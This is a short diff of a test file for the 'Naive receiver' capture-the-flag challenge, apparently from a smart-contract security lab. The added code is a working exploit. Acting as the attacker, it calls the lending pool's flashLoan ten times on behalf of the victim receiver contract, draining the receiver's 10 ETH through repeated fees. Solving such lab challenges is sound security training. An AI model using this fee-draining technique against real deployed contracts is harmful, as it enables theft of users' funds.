@@ -31,6 +31,14 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        //Connect attacker to contract intance
+        const attackerLenderInstance = await this.pool.connect(attacker)
+        //We can take a loan for other contract, so we take a lot of flash loans to receiver contract 
+        //forcing them to pay the fee every time and loosing its 10 ETHER balance
+        for(let i = 0; i<10; i++) {
+            let tx = await attackerLenderInstance.flashLoan(this.receiver.address, ETHER_IN_POOL)
+            await tx.wait()
+        }   
     });
 
     after(async function () {
